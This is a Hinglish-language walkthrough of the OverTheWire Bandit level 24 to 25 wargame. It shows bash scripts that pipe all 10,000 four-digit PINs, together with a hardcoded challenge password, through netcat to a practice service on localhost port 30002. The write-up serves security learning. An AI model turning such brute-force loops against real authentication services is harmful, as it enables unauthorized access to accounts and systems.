OverTheWire Bandit — Level 24 to Level 25

Introduction

Is writeup ka heading Level 24 → Level 25 hai.

Is level mein ek daemon (background service) port 30002 par listen kar raha hai. Ye service aapko bandit25 ka password degi agar aap correctly provide karein:

  • bandit24 ka password
  • Ek secret 4-digit numeric pincode

Pincode retrieve karne ka koi direct way nahi hai. Humein saare 10000 combinations try karne honge, jise brute-force kehte hain.

Humein ek shell script create karni hai jo:

  • 0000 se 9999 tak saare 4-digit numbers iterate kare.
  • Har number ke saath bandit24 ka password combine kare.
  • Netcat ke through server ko send kare.
  • Server ka response check kare.

Objective

Is level mein humein:

  • bandit24 user se SSH login karna hai.
  • Port 30002 par running service ko identify karna hai.
  • Brute-force script create karni hai.
  • Script ko execute karke correct pincode find karna hai.
  • bandit25 ka password receive karna hai.
  • bandit25 user se next SSH login karna hai.

Brute-Force Concept

Brute-Force Kya Hota Hai?

Brute-force ek technique hai jismein saare possible combinations try kiye jate hain jab tak correct combination na mil jaye.

Is level mein:

  • Possible PINs: 0000 se 9999
  • Total combinations: 10000
  • Har combination ko server ko send karna hai.
  • Server correct combination par password return karega.

Why 10000 Combinations?

4-digit numeric pincode ka range:

0000, 0001, 0002, ..., 9998, 9999

Total:

10000 combinations

Netcat (nc) Usage

Netcat Kya Hota Hai?

Netcat ek networking utility hai jo TCP/UDP connections establish karne ke liye use hota hai.

Basic syntax:

nc host port

Is level mein:

nc localhost 30002

Pipe Operator |

Pipe first command ke output ko second command ke input mein send karta hai.

Example:

echo "message" | nc localhost 30002

Flow:

echo output
    ↓
    |
    ↓
nc input → server ko send

Brute-Force Script

Correct Script Syntax

Script create karein:

vim /tmp/brute25.sh

Correct script content:

#!/bin/bash
for i in $(seq -w 0 9999); do
echo "VAFGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
done | nc localhost 30002

Script Explanation

  1. Shebang: #!/bin/bash → Bash interpreter use hoga.
  2. Loop: for i in $(seq -w 0 9999) → 0000 se 9999 tak iterate karega.
  3. seq -w: Numbers ko zero-padded format mein dega (0000, 0001, etc.).
  4. Echo: echo "password $i" → Password aur pincode combine karega.
  5. Pipe: done | nc localhost 30002 → Saare outputs server ko send karega.

Common Errors in Script

Aapke pasted script mein errors the:

# Incorrect (from query):
for i in [0000..9999]  # Wrong syntax
do
echo "..." $i
done nc localhost 30002  # Missing pipe

Correct syntax:

for i in $(seq -w 0 9999); do
echo "VAFGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
done | nc localhost 30002

Alternative Script

Agar seq available nahi hai, to printf use karein:

#!/bin/bash
for i in {0000..9999}; do
echo "VAFGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
done | nc localhost 30002

Timeout Issues

Timeout Error

Agar aapko "Timeout Exiting" error aa raha hai, to ye possible reasons se ho sakta hai:

  • Server connection timeout ho raha hai.
  • Netcat ka version different hai.
  • Server har request ke baad connection close kar raha hai.

Solution: Single Connection

Challenge note kehta hai: "You do not need to create new connections each time"

Iska matlab saare inputs ek hi connection mein send karne chahiye (jo pipe operator automatically karta hai).

Alternative Approach

Agar script timeout ho rahi hai, to manually test karein:

echo "VAFGXJ1PBSsPSnvsjI8p759leLZ9GGar 1234" | nc localhost 30002

Server response check karein.

Security Lessons

Is level se humein ye important lessons milte hain:

  • Brute-force attacks weak authentication ko bypass kar sakte hain.
  • 4-digit PINs easily brute-force ho sakte hain.
  • Shell scripts automation ke liye powerful hain.
  • Netcat network communication ke liye useful hai.
  • Pipe operator commands ko chain karne mein help karta hai.
  • Rate limiting brute-force attacks ko slow kar sakti hai.
  • Strong authentication mechanisms brute-force resistant hone chahiye.
  • Timeout errors debugging mein common hain.
  • Single connection reuse efficiency improve karta hai.
